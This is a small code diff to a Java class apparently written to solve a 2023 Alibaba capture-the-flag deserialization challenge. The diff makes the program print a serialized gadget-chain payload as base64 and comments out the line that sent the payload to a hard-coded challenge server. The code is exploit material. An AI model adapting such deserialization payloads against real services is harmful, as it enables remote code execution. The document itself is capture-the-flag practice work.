@@ -20,9 +20,10 @@ public class AliCTF2023Bypass {
         Object poc = GBadAttributeValueExpException.deserialize2ToString(json);
 
         byte[] code = SerializeUtils.serialize(poc);
+        System.out.println(MiscUtils.base64Encode(code));
 
 //        SerializeUtils.deserialize(code);
-        MiscUtils.sendToServer("http://112.124.14.13:8070/bypassit", code);
+//        MiscUtils.sendToServer("http://112.124.14.13:8070/bypassit", code);
     }
 
     public static void task2() throws Exception {
